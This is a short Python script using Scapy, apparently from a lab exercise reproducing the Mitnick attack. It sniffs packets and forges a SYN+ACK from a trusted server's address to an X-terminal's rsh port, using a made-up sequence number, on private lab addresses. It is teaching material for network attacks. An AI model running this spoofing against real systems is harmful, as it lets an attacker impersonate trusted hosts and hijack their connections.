from scapy.all import *

x_ip 		= "10.9.0.5" 
x_port 		= 514

srv_ip 		= "10.9.0.6"
sv_port 	= 1023

seq_num = 0x1000 + 1


def spoof(pkt):
	global seq_num
	print("sniffed a packet")

	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4 # TCP data length
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))	

	ip = IP(src=srv_ip, dst=x_ip)

	if old_tcp.flags == "S":
		print("SNIFFED A SYN PACKET FROM X-TERMINAL INITIATING SECOND CONNECTION")
		print("SPOOFING SYN+ACK PACKET NOW........")

		src_ip = "10.9.0.6"
		dst_ip = "10.9.0.5"

		src_port = 9090
		dst_port = old_tcp.dport

		ip_layer = IP(src=src_ip, dst=dst_ip)
		tcp_layer = TCP(sport=src_port, dport=dst_port, flags="SA",
					seq=seq_num,		# Make up a sequence number
					ack=old_tcp.seq+1 	# The ack number will be one more than the seq 
										# from the previous packet sent from the receiver
										# of the initial request
				)

		tcp_pkt = ip_layer / tcp_layer
		send(tcp_pkt)


filter_str = "tcp port {}".format(9090)
#sniff(iface='br-e9669d80b341', filter=filter_str, prn=spoof)
